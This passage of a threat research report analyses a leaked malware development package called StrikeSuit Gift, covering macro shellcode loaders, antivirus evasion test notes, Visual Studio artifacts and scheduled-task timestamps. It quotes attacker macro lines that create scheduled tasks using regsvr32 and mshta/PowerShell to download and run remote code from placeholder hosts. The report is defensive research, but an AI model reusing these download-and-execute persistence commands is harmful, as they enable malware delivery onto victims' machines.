other macros and forms around the internet.\n\n###### The one from test.doc\n\nFile Path: P17028 - StrikeSuit Gift - Office Macro Type\n```\n1\\Source\\CSharp\\VbaCodeCreator\\VbaCodeCreator\\bin\\Debug\\test.doc\n\n```\n\nMD5 3a2e9ca1d063405668d0c134abfa79dc\n\n\nSize of Document: 1.13 MB (1182720 bytes)\n\n\nMD5 of Module1: 0c16c5188ac653ebcc8b6098b619ec0e\n\n\nSize of Module1: 405757\n\n\nThis is a big document. We know from the context that this will likely have macro content. So, we open\nit up using [oledump](https://blog.didierstevens.com/programs/oledump-py/) to look at the internal streams. We can see several chunks of macro content, many\nof which will need to be parsed out for us to read it more clearly.\n\n```\noledump test.doc\n 1:    114 '\\x01CompObj'\n 2:   4096 '\\x05DocumentSummaryInformation'\n 3:   4096 '\\x05SummaryInformation'\n 4:   7265 '1Table'\n 5:    460 'Macros/PROJECT'\n 6:    95 'Macros/PROJECTwm'\n 7: M 682475 'Macros/VBA/Module1'\n 8: m 459686 'Macros/VBA/NewMacros'\n\n```\n\n###### 22\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n 9: m   948 'Macros/VBA/ThisDocument'\n10:   4190 'Macros/VBA/_VBA_PROJECT'\n11:    623 'Macros/VBA/dir'\n12:   4096 'WordDocument'\n\n```\n\nThe embedded macro is easy to carve out, thanks to Didier Steven’s outstanding oledump tool. When\nwe extract Module1, we see the VB script with functions that itemize out a two-dimensional array that\nis later re-assembled and executed from 30 shellcode functions and nearly 1500 sub-arrays. After we\nextracted and converted the arrays, we ended up with a shellcode buffer. When the shellcode is\nexecuted, we get a pop-up box that tells us DllMain has been executed successfully! Huzzah.\n\n###### The one from RawShellcode\n\n\nFile Path: P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\RawShellcode\\\n\n\nFile Name: 2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin\n\n\nMD5: 37626b974a982e65ea2786c3666bd1a7\n\n\nFile size 72.99 KB (74740 bytes)\n\n\nWe spelunked through all the source code and saw many references to what we believe is this file. This\npiece of shellcode, hereafter referred to as “the blob,” is cited in ShellcodeThreadCaller/Main.cpp\n\n###### 23\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nunder the path C:\\\\Users\\\\Rachael\\\\Desktop\\\\2017-08-23 02-55-49\n```\n(2136a783457c7bd8e2f8be9300cb772f).bin.\n\n```\nIn VbaCodeCreator/Program.cs the blob is referenced under the path D:\\P17028 - StrikeSuit\n```\nGift - Office Macro Type 1\\Reference\\RawShellcode\\2017-08-23 02-55-49\n(2136a783457c7bd8e2f8be9300cb772f).bin to be built into the office file “test.doc”.\n\n```\nThis blob is also referenced in P17028 - StrikeSuit Gift - Office Macro Type\n```\n1/Source/C_Cpp/Binary/Binary/Main.cpp, which parses this file and converts each byte into an\n\n```\ninteger value. The converted file is saved to \"C:\\\\Users\\\\Rachael\\\\Desktop\\\\shellcode.dat\".\n\nAnd in VB/ShellcodeLoader/ShellcodeLoader.vb, the default shellcode array from the Metasploit\npost is commented out, and instead, blob is to be read in as Hyeyhafxp =\n```\nMy.Computer.FileSystem.ReadAllBytes(\"./2017-08-23 02-55-49\n(2136a783457c7bd8e2f8be9300cb772f).bin\").\n\n```\nWith a name so specific, and having also located a file by this name within the overall package, we are\nprobably safe in assuming that the references within the source are indeed the file with MD5\n```\n37626b974a982e65ea2786c3666bd1a7. If that’s the case, we can move forward with the next\n\n```\nassumption that this developer is using this blob for testing and trying to make sure that this piece of\nshellcode works within all of their tooling. But what is this blob, exactly? Let’s find out.\n\nLooking at the blob alone, we can see that it does not have a sort of standard file header. Starting at\noffset 0x00C0, there are parts of a Windows PE header, which is always a good indication that we may\nbe looking at an executable file wrapped in a shellcode loader.\n\n```\n000000a0: aa7a a105 78fb 0bf9 5a45 df5a 7fe1 d104 .z..x...ZE.Z....\n000000b0: 75f7 5aed 08e2 fbf8 94f8 ae87 0e1f ba0e u.Z.............\n000000c0: 00b4 09cd 21b8 014c cd21 5468 6973 2070 ....!..L.!This p\n000000d0: 726f 6772 616d 2063 616e 6e6f 7420 6265 rogram cannot be\n000000e0: 2072 756e 2069 6e20 444f 5320 6d6f 6465  run in DOS mode\n000000f0: 2e0d 0d0a 2400 0000 0000 0000 4073 b402 ....$.......@s..\n00000100: 0412 da51 0412 da51 0412 da51 1f8f 4451 ...Q...Q...Q..DQ\n\n```\n\nWhen we load this up in a disassembler like IDA Pro, the first four bytes at the start of the file are\nconverted to a call instruction. A subsequent call leads to a function at offset 0xF684, which is\nresponsible for decoding the remaining payload of the blob.\n\n###### 24\n\n\n-----\n\nAs we started reverse engineering this shellcode function to understand how the payload is deployed at\n[a granular level, we identified a 2019 blog post from Qi Anxin](https://ti.qianxin.com/blog/articles/english-version-of-new-approaches-utilized-by-oceanLotus-to-target-vietnamese-environmentalist/) about this group's HTA downloaders. They\nhad analyzed a version of this shellcode loader, and our findings were consistent. However, unlike their\nfindings, our shellcode did not deploy a remote access tool, but presented us with a message box\nsaying, “DllMain has been executed successfully!”.\n\nAt this point, we see that the blob payload is a generic executable created to test their loaders without\nrisking self-infection or making callouts to live C2 infrastructure. While this seems obvious and sensible,\nthere are several assessments we can make from this knowledge.\n\nThe first is their development capabilities are not the same as those conducting the attacks. This is also\nsupported by the aforenoted use of GUIs, which can easily be used by less technical operators\nconducting attacks.\n\nFurthermore, the development team is sharp enough not to test their kit using actual offensive tooling,\nreducing the risk of accidentally leaking a final payload. The careful handling does not necessarily imply\nthat they are an apex predator, yet it shows that this developer took some basic steps to avoid\naccidentally leaking sensitive information. But no matter the sophistication, malware developers are\nalways human, and all humans make mistakes.\n\n###### The typical VB macro content\n\nFor most of the macro content across all the StrikeSuit Gift projects, the macros were mainly used to\ncreate scheduled tasks that would download additional payloads in a couple of ways. One way uses the\n```\nregsvr32.exe remote download technique that is sometimes referred to as “Squiblydoo.”\n\n```\n\n###### THREAT RESEARCH REPORT\n\n```\nsCMDLine = \"schtasks /create /sc MINUTE /tn \"\"Windows Media Sharing\"\" /tr \"\"\\\"\"regsvr32.exe\\\"\" /s\n/n /u /i:http://server/file.sct scrobj.dll\"\" /mo AAAREGSVR32AAA\"\n\n```\n\nThe other way uses an XML scheduled task with rundll32.exe and arguments to have mshta execute\nVB script that would run a PowerShell download.\n\n###### 25\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n<Command>rundll32.exe</Command>\n<Arguments>mshta vbscript:Execute(\"CreateObject(\"WScript.Shell\").Run\"powershell.exe -nop -w\nhidden -c \"\"IEX ((new-object net.webclient).downloadstring('http://powershell.server'))\"\"\",\n0:code close\")</Arguments>\n\n```\n\n###### 26\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Chapter IV\n\n“It is not good to refuse a gift.”\n\nHomer\n\n\n###### 27\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n#### StrikeSuit malware development conventions\n\nWhen reacting to intrusions and campaigns around the world, analysts and researchers are often left to\nspeculate on the adversary’s capabilities, the tradecraft involved, and the details surrounding the\noriginal malware development environment. However, when we have the source code, we get a better\npicture of what was going on behind the scenes. What we see here largely matches our expectations,\nand yet we learn that malware developers are really no different than your everyday software\ndevelopers.\n\n#### Documenting antivirus and compatibility testing\n\nWhether you work in IT or in a SOC, whether you throw down on NTFS or pcap, whether you work in\nSublime or VS Code, you are probably stuck in a world of note-taking, testing, and documentation.\nThose developing malware face the same challenges in terms of planning, assessing efficacy, and\ntracking bugs and enhancements over time. In the StrikeSuit Gift package, we see evidence of the\nmalware development team performing testing of Office documents on a select set of antivirus\nsolutions.\n\nThe verbatim excerpt below is from the file AVs-Test/Result.txt and demonstrates that this\ndeveloper’s macro solution was absolutely crushing AV as of August 24, 2017.\n\n```\n* AV update ngay 2017/08/24\n                    Office 2010 x86\n- 360 CN O\n- 360 Total Security O\n- AVG IS O\n- Avast O\n- BitDefender O\n- BKAV O\n- CMC O\n- Eset O\n- KIS Trojan-Downloader.Script.Generic\n- McAfee O\n- NIS O\n- Panda IS O\n- Sophos O\n- Synmantec O\n- Windows Defender O\n\n```\n\n###### 28\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nMany of these names you are familiar with and some acronyms for household names. For those that\naren’t obvious, KIS is likely Kaspersky, and NIS is probably Norton. It’s worth highlighting two\nlesser-known names in the list above:\n\n  - **BKAV may be a reference to Bkav Corporation which is one of the more popular antivirus**\n[providers in Vietnam (https://www.bkav.com.vn/home)](https://www.bkav.com.vn/home)\n\n  - **CMC may be a reference to CMC Cyber Security, another Vietnam-centered antivirus provider**\n[(https://cmccybersecurity.com/en/cmc-antivirus-free/)](https://cmccybersecurity.com/en/cmc-antivirus-free/)\n\nBeyond antivirus testing, we see that the malware developers were assessing compatibility with a\nhandful of Microsoft Office versions. The excerpt below is from Office-Versions/Verions.txt, and\nit is clear that the tooling needs some enhancements.\n\n```\nWork:\n- Office 2010 x86\n- Office 2013 x86\n- Office 2016 x86\nFail:\n- Office 2003\n- Office 2007\n- Office 2010 x64 (Type mismatch)\n- Office 2013 x64 (Type mismatch)\n- Office 2016 x64 (Type mismatch)\n\n```\n\n#### Feature testing, housekeeping, and fingerprints\n\nThroughout the source codebase we see common conventions of software development. Malware\ndevelopers face many of the same technological and organizational challenges as any software\ndeveloper. They need to test small features and build incremental capabilities that work together. They\nneed to keep their folder trees tidy, and they need to back up their code in case they make any\ncatastrophic mistakes. They need to keep track of their tasks, their OKRs, and MBOs. They’re doing the\nsame job, just on the other side of the grind. They’re only human, and accordingly, they can’t help but\nleave dirty fingerprints across all their digital work.\n\n###### Cleaning up the development mess with _Cleanup.bat\n\nAlong with the Macros_Builder project, we find a batch file named _Cleanup.bat that appears\ndesigned to delete unnecessary artifacts from the development system. According to 7-zip, the last\n\n###### 29\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nmodified time is sometime around 2013-10-29 00:18, so perhaps this cleanup script was used and\ncopied around from drive to drive, project to project, to allow the developers to quickly scrub their\nworkstations or directories as needed.\n\nFile Path: P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\\n\n\nFile Name: _Cleanup.bat\n\n\nFile Size: 3840\n\n\nThis excerpt of _Cleanup.bat begins with a warning, and a commented out loop for deleting Visual\nStudio Solutions User Options (.SUO) files, after which there is a long list of for loops with different files\nto delete.\n\n```\n@echo off\necho Warning!! This file can delete wanted/needed files! Use with caution!\necho Hit enter to continue using this file, or close it if you do not want to run it.\nREM pause\nfor /f \"tokens=1 delims=\" %%a in ('dir /b /s *.ncb') do (\ndel /Q \"%%a\"\necho %%a deleted.\n)\nREM Dont delete config of VS\nREM /////////////////////////////////////////////////////////////////////////\nREM for /f \"tokens=1 delims=\" %%a in ('dir /b /s /A:H *.suo') do (\nREM attrib -H \"%%a\"\nREM del /Q \"%%a\"\nREM echo %%a deleted.\nREM )\nREM /////////////////////////////////////////////////////////////////////////\n\n```\n\nNeither the exact batch scripting nor the file types are particularly illuminating. This doesn’t look like a\nmalware developer “covering their tracks” but rather a tidy programmer wanting an easy, scriptable way\nto delete chaff that may come from different versions of Visual Studio and different linkers and\ncompilers and code artifacts that span many generations of development technology.\n\n###### 30\n\n\n-----\n\n|File names or extensions|Note|\n|---|---|\n|*.ncb|Visual C++ IntelliSense Database|\n|*.suo|Visual Studio Solutions User Options (excluded)|\n|*.tlh|C/C++ Type Library Header|\n|*.tli|C/C++ Type Library Implementation|\n|*.sdf|Visual Studio Code Browser Database|\n|*.user|Visual Studio User Options|\n|*BuildLog.htm|Visual Studio Build Log (pre-VS2010)|\n|*.ilk|Visual Studio Incremental Linking|\n|*.pdb|Program Database/Debug Symbols|\n|*.idb|Visual Studio Intermediate Debug File|\n|*.obj|Visual Studio Object|\n|*.pch|Precompiled Header|\n|*.ipch|IntelliSense Precompiled Header|\n|*.tlog|MSBuild File Tracker Log|\n|*.vshost.exe|Visual Studio Hosting IDE Process|\n|*.vshost.exe.config|Visual Studio Hosting IDE Process|\n|*.vshost.exe.manifest|Visual Studio Hosting IDE Process|\n|*.old|(?)|\n|*.stdafx.obj|Visual Studio Precompiled Header Object|\n|*.exp|Exported Functions Data|\n|*.Build.CppClean.log|CPPClean Task Log (?)|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 31\n\n\n-----\n\n|*.lastbuildstate|MSBuild (?)|\n|---|---|\n|*.intermediate.manifest|Visual Studio Manifest|\n|*.embed.manifest|Visual Studio Manifest|\n|*.embed.manifest.res|Visual Studio Manifest|\n|*mt.dep|Visual Studio Manifest|\n|*.Cache|Visual Studio|\n|*Properties.Resources.resou rces|Visual Studio|\n|*Form1.resources|Visual Studio|\n|*csproj.FileList.txt|Visual Studio|\n|*.csproj.FileListAbsolute.txt|Visual Studio|\n|*.sbr|Visual Studio Intermediate Symbolic Data|\n|*.bsc|Visual Studio Browser Symbol Data|\n\n\n###### THREAT RESEARCH REPORT\n\n\nWe couldn’t find much evidence of this batch file in other places, but we came up lucky on a Github\nsearch and arrived at this page, which has a nearly word-for-word copy of the batch script\n[functionality: https://github.com/aangaymoi/DALHelper/blob/main/.sln.clean.bat. There are only slight](https://github.com/aangaymoi/DALHelper/blob/main/.sln.clean.bat)\ndifferences between StrikeSuit’s _Cleanup.bat and aangaymoi’s .sln.clean.bat script. The former\nhas the .SUO loop commented out and was present back in 2017, whereas the latter was saved to\nGithub in 2021 and does not exclude the .SUO deletion.\n\nStill, in the StrikeSuit Gift package, it seems as though the _Cleanup.bat script was never run. So, we\nwill let this investigative thread dangle in the wind for now and move on to look at the artifacts of the\ndevelopment process such as the .SUO files.\n\n###### Visual Studio Solution User Options (.suo) analysis\n\nWe were lucky enough to capture a copy of the source code package before the _Cleanup.bat script\nwas run, so we obtained copies of lots of nitty-gritty files that come along with Visual Studio\ndevelopment, including Solution User Options (.suo) files. This is uncommon, and these files are not\n\n###### 32\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nparsed by common aftermarket tooling, so we are left exploring the data structures to look for\ninteresting tidbits that we might tease out of the saved states of each of the solutions.\n\nThe table below shows the unique SUO files from the StrikeSuit package.\n\n**File MD5** **Size** **Path**\n\nf5236b5460f0ccbce6ada486971f8822 46592 Macros_Builder_1_0_unzip/Macros_Builder.v11.suo\n\n74f348b26d6001e7031a2df28ffd6022 52224 Macros_Builder/Macros_Builder.v11.suo\n\n2a095e91df57bba102da019271f5cfc4 74752 WebBuilder_unrar/HtaDotNet/HtaDotnet.v11.suo\n\n154baaa4b752112bb01c810eefdee2c0 65536 WebBuilder/HtaDotNet/HtaDotnet.v11.suo\n\nfc72ee04b9ea2d59c37129ec28d4fdf3 46592 WebBuilder/ShellcodeLoader/.vs/L/v14/.suo\n\neb5559fe5906111077fd7bb8f4d6c165 22016 WebBuilder/ShellcodeLoader/L.suo\n\n4ba0391868475f8c37d363d0453088f6 29696 Binary/Binary.v11.suo\n\n02fecb2fe516df6febdb91f73f49047b 33792 ShellcodeThreadCaller/ShellcodeThreadCaller.v11.s\nuo\n\n00ef5903d48a729032639a57c3931b13 71168 MacrosEmbedding/.vs/MacrosEmbedding/v14/.suo\n\n5b85e1e4def126961860c4b0b49e40b1 35840 MacrosEmbeddingExample/.vs/MacrosEmbeddingE\nxample/v14/.suo\n\na55f547dcd1cac096de7951f1176734c 56832 VbaCodeCreator/.vs/VbaCodeCreator/v14/.suo\n\n9f8d7575033d7c963781ac7af005826c 46080 ShellcodeLoader/ShellcodeLoader.v11.suo\n\n2d9507ad961477d2045d200764dd409d 35328 XmlScriptAnalyst/XmlScriptAnalyst.v11.suo\n\nThanks to a [tip from some friends, we see that we can use the MiTeC Structured Storage Viewer to](https://twitter.com/williballenthin/status/1493737884683169797)\nnavigate through the portions of the SUO data structure.\n\n###### 33\n\n|File MD5|Size|Path|\n|---|---|---|\n|f5236b5460f0ccbce6ada486971f8822|46592|Macros_Builder_1_0_unzip/Macros_Builder.v11.suo|\n|74f348b26d6001e7031a2df28ffd6022|52224|Macros_Builder/Macros_Builder.v11.suo|\n|2a095e91df57bba102da019271f5cfc4|74752|WebBuilder_unrar/HtaDotNet/HtaDotnet.v11.suo|\n|154baaa4b752112bb01c810eefdee2c0|65536|WebBuilder/HtaDotNet/HtaDotnet.v11.suo|\n|fc72ee04b9ea2d59c37129ec28d4fdf3|46592|WebBuilder/ShellcodeLoader/.vs/L/v14/.suo|\n|eb5559fe5906111077fd7bb8f4d6c165|22016|WebBuilder/ShellcodeLoader/L.suo|\n|4ba0391868475f8c37d363d0453088f6|29696|Binary/Binary.v11.suo|\n|02fecb2fe516df6febdb91f73f49047b|33792|ShellcodeThreadCaller/ShellcodeThreadCaller.v11.s uo|\n|00ef5903d48a729032639a57c3931b13|71168|MacrosEmbedding/.vs/MacrosEmbedding/v14/.suo|\n|5b85e1e4def126961860c4b0b49e40b1|35840|MacrosEmbeddingExample/.vs/MacrosEmbeddingE xample/v14/.suo|\n|a55f547dcd1cac096de7951f1176734c|56832|VbaCodeCreator/.vs/VbaCodeCreator/v14/.suo|\n|9f8d7575033d7c963781ac7af005826c|46080|ShellcodeLoader/ShellcodeLoader.v11.suo|\n|2d9507ad961477d2045d200764dd409d|35328|XmlScriptAnalyst/XmlScriptAnalyst.v11.suo|\n\n\n-----\n\nRunning through all the SUO file structures is laborious and didn’t yield much more than a string dump\nwould have done anyway. We find paths to source code files, project names, etc.\n\nWe can infer from the myriad of references in XmlPackageOptions, OutliningStateDir, etc., that the\n```\nHtaDotnet and ShellcodeLoader solutions were originally under the folder path\nG:\\WebBuilder\\Gift_HtaDotnet\\. This is also supported by the PDB paths of older built binaries\n\n```\nwithin the broader StrikeSuit Gift package.\n\nFrom looking at DebuggerWatches values in other projects, we can see that the malware developer was\nactively debugging the historical programs.\n\n**SUO file** **DebuggerWatches**\n```\n WebBuilder/HtaDotNet/HtaDotnet.v11.suo result\n WebBuilder/ShellcodeLoader/.vs/L/v14/.suo (char)77\n WebBuilder/ShellcodeLoader/L.suo (char)77\n\n###### 34\n\n```\n|SUO file|DebuggerWatches|\n|---|---|\n|WebBuilder/HtaDotNet/HtaDotnet.v11.suo|result|\n|WebBuilder/ShellcodeLoader/.vs/L/v14/.suo|(char)77|\n|WebBuilder/ShellcodeLoader/L.suo|(char)77|\n\n\n###### THREAT RESEARCH REPORT\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nThe examination of SUOs was a fruitless exercise and something of a dead end, but it was an important\none to capture. Not all investigative threads turn up DNA and fingerprints. Sometimes they are just\nanother vignette and another ephemeral glimpse into the elusive life of a malware author.\n\nThere’s nothing mind-blowing from this SUO inspection because these structures do not give us any\ngreat insights that the source code does not already provide. However, should you happen to find .SUO\nfiles without accompanying source code, these files could be rich in information about the Visual Studio\nsolution, the malware author, or the original development environment.\n\n#### Development in progress\n\n###### Testing features and functions\n\nAnalysis of this source code package is messy because it is non-linear and involves multiple timelines.\nStill, we see the iterative nature of development and how the malware authors tried and tested small\ncapabilities before integrating them into other projects. Development was clearly in progress at the time\nthis package was leaked, and we can see a few examples of this.\n\nFor example, XmlStrAnalyst was a simple VB project to write an XML scheduled task to disk. This\nproject was built around 8/16/2017. It appeared as a precursor to the functionality that was later pushed\nas an enhancement into the updated version of Macros_Builder, which was modified to use XML\nscheduled tasks.\n\n###### Backup structure\n\nObviously, when you expand upon a piece of older code that works, you don’t want to mess it up with\nalterations. What’s the first thing you do? You back it up! The malware developer working on this project\ncreated archive copies of WebBuilder.rar and Macros_Builder.zip to protect these older, working\nprojects.\n\n###### Macro comparisons\n\nThere were two different versions of MacrosSource.txt in the source code package. We see active\ndevelopment and testing of the macro content through diffing these files.\n\n###### 35\n\n\n-----\n\n|Path in P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\|Size|RAR mod timestamp|\n|---|---|---|\n|Macros_Builder\\Macros_Builder\\MacrosSource.txt|14057|3/10/2016 23:40:00|\n|Macros_Builder\\Macros_Builder\\bin\\Debug\\MacrosSource.txt|18219|7/19/2016 21:34:00|\n\n\n###### THREAT RESEARCH REPORT\n\n\nUsing Visual Studio Code’s built-in comparison capability, we can highlight the line-by-line differences\nin these two files. The most notable difference is that the more recently modified MacrosSource.txt\nhas adjustments to SpawnBase63 procedure to include incorporating an XML scheduled task for\npersistence and execution of the remote download. This change was made partially because the\n```\nMacros_Builder program has a modified add_schedule_vba.txt, which is the source for the macro\n\n```\ncontent. It seems as though the developer ran the debug build of this program with input to the GUI,\nleaving us some juicy network toolmarks of a C2 server that may have been used during testing. How\nexciting! We know. But hold your horses; we will dive into these details soon.\n\n###### 36\n\n\n-----\n\nThere are also two copies of add_schedule_vba.txt, one of which is in an older zip archive of the\n```\nMacros_Builder project. The only change in this file was the addition of additional quotation marks in\n\n```\nthe XMLStr macro arguments for the PowerShell download. Development was obviously in progress.\n\n**Path in P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\** **Size** **Modified time**\n```\n Macros_Builder.zip\\Macros_Builder\\Resources\\add_schedule_v 18115 9/08/2016 03:44:00\n ba.txt\n Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.t 18133 8/17/2017 21:23:00\n xt\n\n###### 37\n\n```\n|Path in P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\|Size|Modified time|\n|---|---|---|\n|Macros_Builder.zip\\Macros_Builder\\Resources\\add_schedule_v ba.txt|18115|9/08/2016 03:44:00|\n|Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.t xt|18133|8/17/2017 21:23:00|\n\n\n###### THREAT RESEARCH REPORT\n\n\n-----\n\n###### Borrowed and repurposed open-source code\n\nThe last piece of assessing the totality of this source code was to look at the various solutions,\nprojects, and components, and then think about which pieces were borrowed or “liberated” from open\nsource code projects. While this may not shed light on the future of the malware projects we see here,\nunderstanding the use of public code speaks to the developers' inspiration.\n\n**Files** **Notes**\n\n`VB/ShellcodeLoader/` These pieces contain age-old macro content with variable names\n\n`-` `ShellcodeLoader.vb` [originally generated by scriptjunkie and used in a 2012 blog post.](https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/)\n\n`CSharp/VbaCodeCreator` This exact code, with randomized variables Zopqv Hyeyhafxp\n```\n   - vba_code_builder.txt Xlbufvetp, etc., are used verbatim across many derivative projects\n\n```\n(rather than generating original VB code from MSF). So, it may not be\ndirectly sourced from this blog, but it is clear that the code was not\ngenerated using meterpreter by the developer. It obviously was\ncopypasta’d from somewhere around the internet.\n```\n                  Vba_code_builder.txt uses the same VBA7 top block with variables\n                  Zopqv Dkhnszol and so forth but then uses some variables to replace\n\n```\nwith shellcode substitutions. These are later replaced in Core.cs\n\n`Macros_Builder` [Base64Encode2 and other functions taken directly from this text file.](https://www.source-code.biz/snippets/vbasic/Base64Coder.bas.txt)\n```\n   - add_schedule_vba.txt\n\n```\nTypes STARTUPINFO and SECURITY_ATTRIBUTES and more could have\nbeen taken directly from ancient VB samples [like this one.](https://www.vbforums.com/showthread.php?172679-Shell)\n\n###### 38\n\n|Files|Notes|\n|---|---|\n|VB/ShellcodeLoader/ - ShellcodeLoader.vb CSharp/VbaCodeCreator - vba_code_builder.txt|These pieces contain age-old macro content with variable names originally generated by scriptjunkie and used in a 2012 blog post. This exact code, with randomized variables Zopqv Hyeyhafxp Xlbufvetp, etc., are used verbatim across many derivative projects (rather than generating original VB code from MSF). So, it may not be directly sourced from this blog, but it is clear that the code was not generated using meterpreter by the developer. It obviously was copypasta’d from somewhere around the internet. Vba_code_builder.txt uses the same VBA7 top block with variables Zopqv Dkhnszol and so forth but then uses some variables to replace with shellcode substitutions. These are later replaced in Core.cs|\n|Macros_Builder - add_schedule_vba.txt|Base64Encode2 and other functions taken directly from this text file. Types STARTUPINFO and SECURITY_ATTRIBUTES and more could have been taken directly from ancient VB samples like this one.|\n\n\n###### THREAT RESEARCH REPORT\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n|WebBuilder/HtaDotNet - HtaDotnet.cs WebBuilder/ShellcodeLoader /Test - Program.cs|These pieces contain several function names originally seen in James Forshaw’s DotNetToJScript, such as Deserialize_2 BuildLoaderDelegate, etc. (here and here).|\n|Macros_Builder/ - _Cleanup.bat|This cleanup script does not have much public presence, or at least not much that is easily searchable. But in February 2021, a very similar script showed up on Github.|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 39\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Chapter V\n\n“Gifts weigh like mountains on a sensitive heart.”\n\nOphelia\n\n\n###### 40\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n#### Stockpiling the unique toolmarks and indicators\n\nIf you’ve made it this far in the story, you are desperately aching to see connections to APT32. But don't\nrush this! Let the suspense wash over you and enjoy this moment. This is the job, and we’re taking our\nsweet time with it.\n\nBefore we hit you with the attribution angles, let’s reassess the surface area of all this data and bubble\nup the unique values that could be helpful in searching for connections. To get us started, we searched\nthrough all of the files, source code, notes, and compiled builds, and extracted toolmarks, names, file\npaths, IP addresses, GUIDs, timestamps, and other dirty developer fingerprints.\n\n###### Usernames, handles, and hostnames\n\nWe extracted a variety of usernames and handles from the various files. It is clear that there are a\ncouple of players at work here, though we do not get much information beyond simple names and a\ndefault Windows hostname.\n\n**Names** **Notes**\n```\n toxic ReadMe.txt, with open date of 2017-08-11\n\n```\n`Rachael` From PDB paths and test paths inside source code\n\n`Arnold` Author name in test.doc created 2017:08:25 08:30:00\n\n`WIN-FF211E5QDM2\\Rachael` Embedded in XmlStr.txt after Rachael executed XmlScriptAnalyst.exe\n\n###### Distinct macro timestamps from a scheduled task XML file\n\n|Names|Notes|\n|---|---|\n|toxic|ReadMe.txt, with open date of 2017-08-11|\n|Rachael|From PDB paths and test paths inside source code|\n|Arnold|Author name in test.doc created 2017:08:25 08:30:00|\n|WIN-FF211E5QDM2\\Rachael|Embedded in XmlStr.txt after Rachael executed XmlScriptAnalyst.exe|\n\n\n**Seven digit decimals in a timestamp**\n\n\nOne oddly notable project in the StrikeSuit Gift package is XmlStrAnalyst, which seems to be a test\nfor building or modifying XML scheduled tasks. It uses VB code to write to an outfile XmlStr.txt.\n\nLooking at the top of the XmlStr.txt document, we see it is indeed raw XML for a Windows scheduled\ntask. What stands out immediately are unique timestamps that speak to the potential age of the original\nmalware development.\n\n###### 41\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n  <Date>2016-06-02T11:13:39.1668838</Date>\n  <Author>WIN-FF211E5QDM2\\Rachael</Author>\n </RegistrationInfo>\n<Triggers>\n  <TimeTrigger>\n    <Repetition>\n     <Interval>PTBBBPOWERBBBM</Interval>\n     <StopAtDurationEnd>false</StopAtDurationEnd>\n</Repetition>\n    <StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary>\n    <Enabled>true</Enabled>\n</TimeTrigger>\n </Triggers>\n\n```\n\nThese hard-coded timestamps are observed in both Macros_Builder’s add_schedule_vba.txt and\n```\nXmlScriptAnalyst’s Module1.vb. They are subsequently written into MacrosSource.txt and\nXmlStr.txt when Macros_Builder.exe or XmlScriptAnalyst.exe are executed, respectively.\n\n```\nIt may be worthwhile to note that these are unique timestamps, and at first glance, it seems odd that\nthe timestamps have seven digits of precision after the seconds value. With seven digits, we know it’s\nnot milliseconds, it's not microseconds, it’s not nanoseconds. So how exactly did these seven-digit\ntimestamps get made, anyway? We presume it has to be created by Windows, somehow.\n\n  - `2016-06-02T11:13:39.1668838`\n\n  - `2016-06-02T11:12:49.4495965`\n\n###### Testing the export of scheduled tasks XML\n\nThe simplest explanation for the timestamps above is that before this was put into any VB script or\nVisual Studio solution, the malware developer created and exported an XML scheduled task using the\nWindows Task Scheduler. They used that as a template for the Macros_Builder and\n```\nXmlScriptAnalyst projects. To test this theory, we jump into a VM and try to recreate how a malware\n\n```\nauthor might create and export the Scheduled Task XML.\n\n**Step 1: Using the Windows Task Scheduler, we create a test task.**\n\n###### 42\n\n\n-----\n\n**Step 2: We create a trigger to initiate the task once, and then we select the repeat task every one hour**\nand set the duration to Indefinitely. Note that the start time we select here will be 2022-03-02 at\n8:41:05AM (EST in our Virtual Machine).\n\n###### 43\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n**Step 3: We create an action for the task to run rundll32.exe with arguments to execute a VB scriptlet.**\n\n**Step 4: We finalize the Scheduled Task, then right-click the task entry and export to an XML file.**\n\n###### 44\n\n\n-----\n\n**Step 5: We view the exported scheduled task XML and see that it indeed contains the date timestamps**\nwith seven points of decimal precision. Further, we see that the Task Scheduler embeds the author\ncomputer name and username in our test file. We confirm that the RegistrationInfo Date timestamp is\nwhen we created the task, and the Trigger StartBoundary timestamp is when our task is set to begin.\nWhat a joyous day.\n\n\n###### THREAT RESEARCH REPORT\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n <RegistrationInfo>\n  <Date>2022-03-02T08:43:01.7591912</Date>\n  <Author>user-PC\\user</Author>\n </RegistrationInfo>\n <Triggers>\n  <TimeTrigger>\n    <Repetition>\n     <Interval>PT1H</Interval>\n     <StopAtDurationEnd>false</StopAtDurationEnd>\n    </Repetition>\n    <StartBoundary>2022-03-02T08:41:05.5580189</StartBoundary>\n    <Enabled>true</Enabled>\n  </TimeTrigger>\n </Triggers>\n\n```\n\n###### 45\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n <Principals>\n  <Principal id=\"Author\">\n    <UserId>user-PC\\user</UserId>\n    <LogonType>InteractiveToken</LogonType>\n    